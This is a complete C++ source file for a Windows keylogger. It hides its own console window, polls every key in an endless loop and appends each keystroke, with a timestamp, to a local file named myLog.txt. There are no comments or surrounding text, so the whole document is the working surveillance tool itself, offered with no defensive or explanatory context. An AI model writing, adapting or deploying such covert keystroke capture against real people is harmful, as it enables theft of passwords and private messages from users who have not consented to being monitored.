#define _WIN32_WINNT 0x0500

#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

#include <iostream>
#include <sstream>
#include <fstream>
#include <string>

using namespace std;

#pragma comment(lib, "User32.lib")


string getTime()
{
		time_t t = time(0);
		struct tm * now = localtime(&t);
		std::stringstream sstm;
		sstm << (now->tm_hour) << ':' << (now->tm_min) << ':' << now->tm_sec;
		string s = sstm.str();
		return s;
}


void write(string input) {
	fstream writeFile;
	writeFile.open("myLog.txt", fstream::app);
	if (writeFile.is_open()) {
		writeFile << input;
		writeFile.close();
	}
}


bool specials(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		write(getTime() + " : [SPACE]");
		write("\n");
		return true;
	case VK_RETURN:
	  write(getTime() + " : [ENTER]");
		write("\n");
		return true;
	case '¾':
		write(getTime() + " : .");
		write("\n");
		return true;
	case VK_SHIFT:
		write(getTime() + " : [SHIFT]");
		write("\n");
		return true;
	case VK_BACK:
		write(getTime() + " : [BACKSPACE]");
		write("\n");
		return true;
	case VK_RBUTTON:
		write("#R_CLICK#");
		return true;
	default:
		return false;
	}
}


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (specials(KEY) == false) {

					fstream writeFile;
					writeFile.open("myLog.txt", fstream::app);
					if (writeFile.is_open()) {
						writeFile << getTime() + " : ";
						writeFile << char(KEY);
						writeFile << "\n";
						writeFile.close();
					}

				}
			}
		}
	}

	return 0;
}
